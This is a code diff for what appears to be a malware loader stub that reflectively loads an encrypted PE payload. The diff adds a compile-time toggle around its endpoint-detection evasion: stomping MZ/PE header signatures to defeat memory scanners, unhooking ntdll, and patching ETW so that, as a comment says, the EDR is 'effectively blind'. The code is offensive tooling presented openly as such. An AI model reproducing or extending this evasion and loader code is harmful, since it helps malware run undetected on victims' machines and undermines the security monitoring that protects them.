@@ -28,6 +28,9 @@
 /* ─── Generated per-build: encrypted payload + seed ─── */
 #include "stub_payload.h"
 
+/* ─── Evasion toggle: set to 1 to enable unhook/ETW/signature stomp ─── */
+#define STUB_EVASION_ENABLED 0
+
 
 /* ═══════════════════════════════════════════════════════════════════
  * PEB structures (mirrors the agent's api_resolve.c)
@@ -1020,15 +1023,15 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     }
 #endif
 
-    /* Stomp MZ/PE signatures — enough to defeat memory scanners looking
-     * for reflectively loaded PEs, but leaves the rest of the header
-     * page intact so the CRT and runtime can still read data directories,
-     * section table, etc.  Only 6 bytes are touched. */
     DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
     WORD peChars   = mappedNt->FileHeader.Characteristics;
     if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }
 
-    /* Stomp MZ signature (2 bytes) and PE\0\0 signature (4 bytes) */
+#if STUB_EVASION_ENABLED
+    /* Stomp MZ/PE signatures — enough to defeat memory scanners looking
+     * for reflectively loaded PEs, but leaves the rest of the header
+     * page intact so the CRT and runtime can still read data directories,
+     * section table, etc.  Only 6 bytes are touched. */
     {
         PVOID region = base;
         SIZE_T sz = mappedNt->OptionalHeader.SizeOfHeaders;
@@ -1047,6 +1050,9 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
         }
         SLOG("[stub] MZ/PE signatures stomped");
     }
+#else
+    SLOG("[stub] signature stomp DISABLED for testing");
+#endif
 
     void *entry = base + entryRVA;
     SHEX("[stub] entry", (ULONG_PTR)entry);
@@ -1185,6 +1191,7 @@ void _stub_entry(void) {
      * the patching. After this point the EDR is effectively blind to
      * our ntdll-level operations.
      */
+#if STUB_EVASION_ENABLED
     {
         BYTE *k32   = _find_module(H_KERNEL32);
         BYTE *ntdll = _find_module(H_NTDLL);
@@ -1192,10 +1199,6 @@ void _stub_entry(void) {
             _unhook_ntdll(k32, ntdll);
             _patch_etw(k32, ntdll);
 
-            /* Re-resolve Nt* APIs — the function bodies are now
-             * clean but the addresses haven't changed. However,
-             * re-resolving ensures we pick up the correct entry
-             * points in case the EDR had trampolined elsewhere. */
             api.pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory_t)
                 _resolve_export(ntdll, H_NtAllocateVirtualMemory);
             api.pNtProtectVirtualMemory = (fnNtProtectVirtualMemory_t)
@@ -1205,6 +1208,9 @@ void _stub_entry(void) {
             SLOG("[stub] Nt* re-resolved after unhook");
         }
     }
+#else
+    SLOG("[stub] evasion DISABLED for testing");
+#endif
 
     /* Phase 2: Derive RC4 key from seed */
     SLOG("[stub] deriving key...");
